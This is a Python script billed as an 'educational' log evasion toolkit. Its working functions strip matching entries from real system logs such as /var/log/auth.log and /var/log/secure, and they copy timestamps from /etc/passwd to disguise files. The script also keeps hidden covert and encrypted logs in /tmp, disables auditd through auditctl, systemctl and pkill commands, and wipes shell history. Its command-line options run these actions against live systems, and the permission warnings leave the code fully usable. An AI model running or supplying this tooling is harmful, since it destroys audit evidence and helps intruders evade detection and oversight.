#!/usr/bin/env python3
"""
Log Evasion Techniques - Educational demonstration of log manipulation methods

This script demonstrates various techniques attackers use to evade log-based detection:
- Selective log manipulation
- Timestamp modification
- Alternative logging channels
- Log cleaning automation

WARNING: Only use on systems you own or have permission to test.

Usage: python log_evasion.py [options]
"""

import os
import sys
import time
import shutil
import hashlib
import tempfile
import argparse
from datetime import datetime
from cryptography.fernet import Fernet

class LogEvasionToolkit:
    def __init__(self):
        self.common_log_paths = [
            '/var/log/auth.log',
            '/var/log/syslog', 
            '/var/log/kern.log',
            '/var/log/messages',
            '/var/log/secure',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log'
        ]
        
        # Patterns that might indicate malicious activity
        self.suspicious_patterns = [
            'Failed password',
            'authentication failure',
            'sudo',
            'su ',
            'SSH',
            'login',
            'cron',
            'systemd'
        ]
    
    def backup_logs(self, log_path, backup_dir="/tmp/.log_backup"):
        """
        Create backup of original logs before modification
        
        Args:
            log_path (str): Path to log file
            backup_dir (str): Directory to store backups
        """
        if not os.path.exists(backup_dir):
            os.makedirs(backup_dir, mode=0o755)
        
        if os.path.exists(log_path):
            backup_name = f"{os.path.basename(log_path)}.{int(time.time())}"
            backup_path = os.path.join(backup_dir, backup_name)
            shutil.copy2(log_path, backup_path)
            print(f"[+] Backed up {log_path} to {backup_path}")
            return backup_path
        return None
    
    def selective_log_removal(self, log_path, patterns_to_remove):
        """
        Remove specific log entries matching given patterns
        
        Args:
            log_path (str): Path to log file to modify
            patterns_to_remove (list): List of patterns to remove
        """
        if not os.path.exists(log_path):
            print(f"[-] Log file not found: {log_path}")
            return False
        
        try:
            # Read original content
            with open(log_path, 'r') as f:
                lines = f.readlines()
            
            # Filter out matching lines
            filtered_lines = []
            removed_count = 0
            
            for line in lines:
                should_remove = False
                for pattern in patterns_to_remove:
                    if pattern.lower() in line.lower():
                        should_remove = True
                        removed_count += 1
                        break
                
                if not should_remove:
                    filtered_lines.append(line)
            
            # Write filtered content back
            with open(log_path, 'w') as f:
                f.writelines(filtered_lines)
            
            print(f"[+] Removed {removed_count} entries from {log_path}")
            return True
            
        except Exception as e:
            print(f"[-] Error modifying {log_path}: {e}")
            return False
    
    def timestamp_manipulation(self, file_path, reference_file=None):
        """
        Modify file timestamps to blend in with system files
        
        Args:
            file_path (str): File to modify timestamps
            reference_file (str): File to copy timestamps from
        """
        try:
            if reference_file and os.path.exists(reference_file):
                # Copy timestamps from reference file
                ref_stat = os.stat(reference_file)
                os.utime(file_path, (ref_stat.st_atime, ref_stat.st_mtime))
                print(f"[+] Copied timestamps from {reference_file} to {file_path}")
            else:
                # Set to a past date to avoid suspicion
                past_time = time.time() - (30 * 24 * 3600)  # 30 days ago
                os.utime(file_path, (past_time, past_time))
                print(f"[+] Set {file_path} timestamp to 30 days ago")
            
            return True
            
        except Exception as e:
            print(f"[-] Error modifying timestamps: {e}")
            return False
    
    def create_covert_log(self, message, covert_path="/tmp/.system_cache"):
        """
        Create covert logging channel disguised as system file
        
        Args:
            message (str): Message to log covertly
            covert_path (str): Path for covert log file
        """
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Disguise as system cache file
            disguised_entry = f"# Cache update {timestamp}: {message}\n"
            
            with open(covert_path, 'a') as f:
                f.write(disguised_entry)
            
            # Make it look like a system file
            self.timestamp_manipulation(covert_path, "/etc/passwd")
            os.chmod(covert_path, 0o644)
            
            print(f"[+] Covert log entry added to {covert_path}")
            return True
            
        except Exception as e:
            print(f"[-] Error creating covert log: {e}")
            return False
    
    def encrypted_logging(self, message, key_path="/tmp/.cache_key"):
        """
        Create encrypted log entries
        
        Args:
            message (str): Message to encrypt and log
            key_path (str): Path to encryption key
        """
        try:
            # Generate or load encryption key
            if not os.path.exists(key_path):
                key = Fernet.generate_key()
                with open(key_path, 'wb') as f:
                    f.write(key)
                os.chmod(key_path, 0o600)
            else:
                with open(key_path, 'rb') as f:
                    key = f.read()
            
            # Encrypt message
            cipher = Fernet(key)
            encrypted_msg = cipher.encrypt(message.encode())
            
            # Store in hidden location
            log_path = "/tmp/.system_data"
            with open(log_path, 'ab') as f:
                f.write(encrypted_msg + b'\n')
            
            print(f"[+] Encrypted log entry stored")
            return True
            
        except Exception as e:
            print(f"[-] Error with encrypted logging: {e}")
            return False
    
    def log_rotation_abuse(self, log_path):
        """
        Abuse log rotation to hide evidence
        
        Args:
            log_path (str): Log file to rotate
        """
        try:
            if not os.path.exists(log_path):
                print(f"[-] Log file not found: {log_path}")
                return False
            
            # Force log rotation by creating large dummy entries
            with open(log_path, 'a') as f:
                # Add large amount of benign data to trigger rotation
                for i in range(1000):
                    f.write(f"# System maintenance check {i}: OK\n")
            
            print(f"[+] Forced log rotation for {log_path}")
            return True
            
        except Exception as e:
            print(f"[-] Error forcing log rotation: {e}")
            return False
    
    def disable_audit_logging(self):
        """
        Attempt to disable audit logging (requires root)
        """
        audit_commands = [
            "auditctl -e 0",  # Disable audit system
            "systemctl stop auditd",  # Stop audit daemon
            "service auditd stop",  # Alternative stop command
            "pkill -f auditd"  # Kill audit processes
        ]
        
        print("[*] Attempting to disable audit logging...")
        
        for cmd in audit_commands:
            try:
                os.system(f"{cmd} 2>/dev/null")
                print(f"[+] Executed: {cmd}")
            except:
                print(f"[-] Failed: {cmd}")
    
    def clean_command_history(self):
        """
        Clean command history files
        """
        history_files = [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
            os.path.expanduser("~/.history"),
            "/root/.bash_history",
            "/root/.zsh_history"
        ]
        
        print("[*] Cleaning command history...")
        
        for hist_file in history_files:
            try:
                if os.path.exists(hist_file):
                    # Option 1: Clear the file
                    open(hist_file, 'w').close()
                    print(f"[+] Cleared {hist_file}")
                    
                    # Option 2: Remove specific commands (commented out)
                    # self.selective_log_removal(hist_file, ["suspicious_command"])
                    
            except Exception as e:
                print(f"[-] Error cleaning {hist_file}: {e}")
        
        # Disable history for current session
        os.environ['HISTSIZE'] = '0'
        os.environ['HISTFILE'] = '/dev/null'
        print("[+] Disabled history for current session")
    
    def demonstrate_evasion_techniques(self):
        """
        Demonstrate various log evasion techniques
        """
        print("=== Log Evasion Techniques Demonstration ===")
        print()
        
        # Create test log file
        test_log = "/tmp/test_application.log"
        test_entries = [
            "2024-01-15 10:30:15 INFO: Application started",
            "2024-01-15 10:30:45 INFO: User login: admin",
            "2024-01-15 10:31:00 WARNING: Failed password for attacker",
            "2024-01-15 10:31:15 ERROR: Suspicious activity detected",
            "2024-01-15 10:31:30 INFO: Normal operation resumed",
            "2024-01-15 10:32:00 INFO: Backup completed"
        ]
        
        # Create test log
        with open(test_log, 'w') as f:
            f.write('\n'.join(test_entries))
        
        print(f"[+] Created test log: {test_log}")
        
        # Demonstrate backup
        backup_path = self.backup_logs(test_log)
        
        # Demonstrate selective removal
        self.selective_log_removal(test_log, ["attacker", "suspicious"])
        
        # Demonstrate timestamp manipulation
        self.timestamp_manipulation(test_log, "/etc/passwd")
        
        # Demonstrate covert logging
        self.create_covert_log("Covert operation completed")
        
        # Demonstrate encrypted logging
        self.encrypted_logging("Sensitive operational data")
        
        print()
        print("=== Before and After Comparison ===")
        
        if backup_path:
            print("Original log content:")
            with open(backup_path, 'r') as f:
                print(f.read())
        
        print("Modified log content:")
        with open(test_log, 'r') as f:
            print(f.read())

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Educational Log Evasion Toolkit')
    parser.add_argument('--demo', action='store_true', 
                       help='Run demonstration of evasion techniques')
    parser.add_argument('--clean-logs', action='store_true',
                       help='Clean system logs (requires appropriate permissions)')
    parser.add_argument('--clean-history', action='store_true',
                       help='Clean command history')
    parser.add_argument('--covert-log', type=str,
                       help='Add covert log entry')
    parser.add_argument('--target-log', type=str,
                       help='Target log file for operations')
    parser.add_argument('--remove-pattern', type=str,
                       help='Pattern to remove from logs')
    
    args = parser.parse_args()
    
    # Ethical warning
    print("=" * 60)
    print("EDUCATIONAL LOG EVASION TOOLKIT")
    print("=" * 60)
    print("WARNING: Only use on systems you own or have permission to test!")
    print("Unauthorized log manipulation may be illegal in your jurisdiction.")
    print()
    print("This tool is for educational purposes and authorized security testing only.")
    print("=" * 60)
    print()
    
    toolkit = LogEvasionToolkit()
    
    if args.demo:
        toolkit.demonstrate_evasion_techniques()
    
    elif args.clean_logs:
        print("[*] Attempting to clean system logs...")
        for log_path in toolkit.common_log_paths:
            if os.path.exists(log_path):
                toolkit.backup_logs(log_path)
                toolkit.selective_log_removal(log_path, ["error", "failed", "denied"])
    
    elif args.clean_history:
        toolkit.clean_command_history()
    
    elif args.covert_log:
        toolkit.create_covert_log(args.covert_log)
    
    elif args.target_log and args.remove_pattern:
        toolkit.backup_logs(args.target_log)
        toolkit.selective_log_removal(args.target_log, [args.remove_pattern])
    
    else:
        parser.print_help()
        print()
        print("Educational Examples:")
        print("  --demo                     # Run full demonstration")
        print("  --clean-history           # Clean command history")
        print("  --covert-log 'message'    # Add covert log entry")
        print("  --target-log /path/to/log --remove-pattern 'suspicious'")

if __name__ == "__main__":
    main()